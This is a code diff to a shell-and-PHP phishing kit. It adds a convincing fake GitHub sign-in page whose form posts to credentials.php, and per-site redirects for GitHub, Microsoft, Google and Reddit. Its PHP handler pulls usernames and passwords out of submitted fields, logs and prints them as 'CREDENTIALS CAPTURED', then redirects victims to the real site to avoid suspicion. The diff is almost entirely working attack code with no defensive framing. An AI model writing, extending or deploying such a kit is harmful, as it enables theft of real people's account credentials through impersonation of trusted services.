@@ -148,10 +148,192 @@ create_default_page() {
 EOF
 }
 
+# Function to create a specialized GitHub login form
+create_github_page() {
+    echo -e "${YELLOW}[INFO]${NC} Creating specialized GitHub login page..."
+    cat > index.html << 'EOF'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to GitHub · GitHub</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #24292e;
+            background-color: #f6f8fa;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-container {
+            width: 340px;
+            margin: 0 auto;
+        }
+        .logo {
+            display: block;
+            margin: 40px auto 15px;
+            width: 48px;
+            height: 48px;
+        }
+        .login-form {
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid #d8dee2;
+            border-radius: 5px;
+            margin-bottom: 16px;
+        }
+        .login-form h1 {
+            margin-bottom: 15px;
+            font-size: 24px;
+            font-weight: 300;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 7px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .form-control {
+            padding: 6px 12px;
+            font-size: 14px;
+            width: 100%;
+            border: 1px solid #d1d5da;
+            border-radius: 3px;
+            outline: none;
+            box-sizing: border-box;
+            height: 32px;
+        }
+        .form-control:focus {
+            border-color: #2188ff;
+            box-shadow: 0 0 0 3px rgba(3, 102, 214, 0.3);
+        }
+        .btn {
+            background-color: #2ea44f;
+            color: #fff;
+            padding: 6px 12px;
+            font-size: 14px;
+            font-weight: 600;
+            border: 1px solid rgba(27, 31, 35, 0.15);
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            height: 32px;
+            margin-top: 15px;
+        }
+        .btn:hover {
+            background-color: #2c974b;
+        }
+        .signin-link {
+            color: #0366d6;
+            text-decoration: none;
+        }
+        .signin-link:hover {
+            text-decoration: underline;
+        }
+        .login-callout {
+            padding: 15px 20px;
+            text-align: center;
+            border: 1px solid #d8dee2;
+            border-radius: 5px;
+            background-color: #fff;
+        }
+        .footer {
+            margin: 40px auto;
+            text-align: center;
+            font-size: 12px;
+            color: #6a737d;
+            max-width: 500px;
+        }
+        .footer-links {
+            margin-bottom: 10px;
+        }
+        .footer-links a {
+            color: #0366d6;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTE2IDBDNy4xNiAwIDAgNy4xNiAwIDE2QzAgMjMuMDggNC41OCAyOS4wNiAxMC45NCAzMS4xOEMxMS43NCAzMS4zMiAxMi4wNCAxNC44NCAxMi4wNCAxNC40QzEyLjA0IDE0LjQgMTEuOTIgMTMuOTggMTEuOTIgMTMuNDZDMTEuOTIgMTIuNDYgMTIuNSAxMS40MiAxMi42NCAxMS4xQzEwLjMgMTAuOCA2LjE2IDguMTggNi4xNiA0LjE2QzYuMTYgMi40NiA2Ljg0IDAuODYgOC4wMiAtMC4wMkM4LjIyIC0wLjE2IDguMzYgLTAuMDYgOC40NCAwLjA4QzguNDQgMC4wOCAxMC40MiAzLjA0IDEyLjU2IDQuMzRDMTMuNzggNC4xNiAxNC42IDQuMSAxNS40MiA0LjFDMTYuMjIgNC4xIDE3LjAyIDQuMTYgMTguMjQgNC4zNEMyMC40IDMuMDQgMjIuMzggMC4xIDIyLjM4IDAuMUMyMi40NCAtMC4wNiAyMi42IC0wLjE0IDIyLjc4IC0wLjAyQzI0IDEuMSAyNC42NiAyLjggMjQuNjYgNC4xNkMyNC42NiA4LjI0IDIwLjQgMTAuODQgMTguMDYgMTEuMTJDMTguMjYgMTEuNTggMTguODQgMTIuODYgMTguODQgMTQuMUMxOC44NCAxNS40NCAxOC44IDE4LjEyIDE4Ljc4IDIwLjM0QzE4Ljc4IDIxLjA4IDE4Ljc2IDIxLjggMTguNzYgMjIuNUMxOC43NCAyMy4yMiAxOC43NCAyMy45MiAxOC43NCAyNC41OEMxOC43NCAyNS4xNiAxOC43NiAyNS42OCAxOC44IDI2LjA0QzE4Ljg4IDI2Ljg4IDE5LjA0IDI3LjQgMTkuODQgMjcuNjJDMjEuNTYgMjguMDggMjQgMjcuNTQgMjUuMTYgMjYuOTZDMjcuMzIgMjUuODggMjkuMyAyNC4xIDMwLjY2IDIxLjc0QzMxLjUgMjAuMjYgMzIgMTggMzIgMTZDMzIgNy4xNiAyNC44NCAwIDE2IDBaIiBmaWxsPSIjMjQyOTJlIi8+PC9zdmc+" class="logo" alt="GitHub">
+            <div class="login-form">
+                <h1>Sign in to GitHub</h1>
+                <form action="credentials.php" method="post">
+                    <div class="form-group">
+                        <label for="login_field">Username or email address</label>
+                        <input type="text" name="login" id="login_field" class="form-control" autocapitalize="off" autocorrect="off" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" name="password" id="password" class="form-control" required>
+                    </div>
+                    <input type="submit" name="commit" value="Sign in" class="btn" data-disable-with="Signing in...">
+                </form>
+            </div>
+            <div class="login-callout">
+                <span>New to GitHub? </span>
+                <a href="#" class="signin-link">Create an account</a>.
+            </div>
+        </div>
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Terms</a>
+                <a href="#">Privacy</a>
+                <a href="#">Security</a>
+                <a href="#">Contact GitHub</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+EOF
+}
+
 # Function to clone a website
 clone_website() {
     local target_url=$1
     local clone_dir="cloned_site"
+    local redirect_url=""
+    
+    # Set appropriate redirect URL based on target
+    if [[ "$target_url" == *"github.com"* ]]; then
+        redirect_url="https://github.com"
+        # For GitHub, use our specialized template which works better than cloning
+        create_github_page
+        echo -e "${GREEN}[SUCCESS]${NC} Created specialized GitHub login page"
+        return 0
+    elif [[ "$target_url" == *"microsoft.com"* ]] || [[ "$target_url" == *"live.com"* ]]; then
+        redirect_url="https://www.microsoft.com"
+    elif [[ "$target_url" == *"google.com"* ]]; then
+        redirect_url="https://www.google.com"
+    elif [[ "$target_url" == *"reddit.com"* ]]; then
+        redirect_url="https://www.reddit.com"
+    else
+        # Extract domain for redirect
+        redirect_url=$(echo "$target_url" | grep -o 'https\?://[^/]*' || echo "https://www.google.com")
+    fi
+    
+    # Store the redirect URL for the credential script to use
+    echo "$redirect_url" > redirect_url.txt
     
     # Create temporary directory for cloning
     mkdir -p "$clone_dir"
@@ -250,29 +432,44 @@ $password = '';
 
 // Check for POST data (form submission)
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Try to capture credentials regardless of field names
-    foreach ($_POST as $key => $value) {
-        // Look for common username/email field names
-        if (stripos($key, 'user') !== false || 
-            stripos($key, 'email') !== false || 
-            stripos($key, 'login') !== false || 
-            stripos($key, 'id') !== false || 
-            stripos($key, 'account') !== false || 
-            stripos($key, 'name') !== false || 
-            stripos($key, 'mail') !== false) {
-            $username = $value;
-        }
-        
-        // Look for common password field names
-        if (stripos($key, 'pass') !== false || 
-            stripos($key, 'pwd') !== false || 
-            stripos($key, 'secret') !== false || 
-            stripos($key, 'pw') !== false) {
-            $password = $value;
+    // Output all POST data for debugging
+    error_log("DEBUG - All POST fields: " . print_r($_POST, true));
+    
+    // Check for GitHub specific fields first
+    if (isset($_POST['login']) && !empty($_POST['login'])) {
+        $username = $_POST['login'];
+    }
+    
+    // If not GitHub, try to capture credentials from common field names
+    if (empty($username)) {
+        foreach ($_POST as $key => $value) {
+            // Look for common username/email field names
+            if (stripos($key, 'user') !== false || 
+                stripos($key, 'email') !== false || 
+                stripos($key, 'login') !== false || 
+                stripos($key, 'id') !== false || 
+                stripos($key, 'account') !== false || 
+                stripos($key, 'name') !== false || 
+                stripos($key, 'mail') !== false ||
+                $key === 'username' || 
+                $key === 'email' ||
+                $key === 'login' ||
+                $key === 'loginId') {
+                $username = $value;
+            }
+            
+            // Look for common password field names
+            if (stripos($key, 'pass') !== false || 
+                stripos($key, 'pwd') !== false || 
+                stripos($key, 'secret') !== false || 
+                stripos($key, 'pw') !== false ||
+                $key === 'password') {
+                $password = $value;
+            }
         }
     }
     
-    // If we didn't find specific fields, log all POST data
+    // If we still didn't find specific fields, log all POST data
     $all_post_data = '';
     if (empty($username) && empty($password)) {
         foreach ($_POST as $key => $value) {
@@ -310,11 +507,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Output to the browser (this will be seen in the PHP error log)
     error_log("CREDENTIALS CAPTURED - Username: $username, Password: $password");
     
-    // Display captured credentials in real-time in the terminal
+    // Console output for real-time monitoring
     echo "SUCCESS! Credentials captured:\nUsername: $username\nPassword: $password\n";
     
+    // Determine where to redirect
+    $redirect = 'https://github.com';
+    
+    // Check if we have a custom redirect URL
+    if (file_exists('redirect_url.txt')) {
+        $redirect = trim(file_get_contents('redirect_url.txt'));
+    }
+    
     // Redirect to a legitimate site (to avoid suspicion)
-    header('Location: https://portal.lumoninc.com');
+    header('Location: ' . $redirect);
     exit;
 }
 ?>
